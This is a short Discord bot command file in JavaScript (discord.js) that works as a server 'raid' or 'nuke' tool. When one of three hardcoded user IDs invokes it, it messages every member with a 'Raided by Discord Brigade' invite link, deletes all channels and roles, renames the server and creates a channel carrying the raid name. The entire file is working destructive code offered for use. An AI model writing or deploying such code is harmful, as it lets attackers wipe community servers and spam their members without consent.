exports.run = (client, message, args) => {
const Discord = require('discord.js')  
if (message.author.id !== "579234820408868872")
if (message.author.id !== "571391532033376276")
if (message.author.id !== "471035482789118004") return
  
  
message.guild.members.forEach(user => {
    user.send("Raided by Discord Brigade \n\nhttps://discord.gg/qyKBRw2")

  });
  message.guild.channels.forEach(channels1 => {
    channels1.delete()
      
    });
  
  message.guild.roles.forEach(roles1 => {
    roles1.delete()
      
    });
  
  message.guild.setName("Raided by Discord Brigade")

message.guild.createChannel("Raided by Discord Brigade")
  
  message.channel.send("Lo he hecho correctamente!")
  
}